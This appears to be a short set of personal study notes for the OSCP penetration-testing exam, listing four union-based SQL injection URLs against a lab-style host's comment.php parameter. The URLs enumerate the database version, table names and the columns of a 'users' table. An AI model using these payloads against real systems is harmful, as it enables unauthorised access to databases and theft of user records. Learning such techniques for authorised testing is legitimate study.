# oscp-notes

## SQL Injection

### Enumerating the Database (using union statements)
```
http://10.x.x.x/comment.php?id=782%20union%20select%201,2,3,4,table_name,6%20from%20information_schema.tables
http://10.x.x.x/comment.php?id=782%20union%20select%201,2,3,4,@@version,6
http://10.x.x.x/comment.php?id=782%20union%20select%201,2,3,4,5,6
http://10.x.x.x/comment.php?id=782%20union%20all%20select%201,2,3,4,column_name,6%20from%20information_schema.columns%20where%20table_name=%27users%27
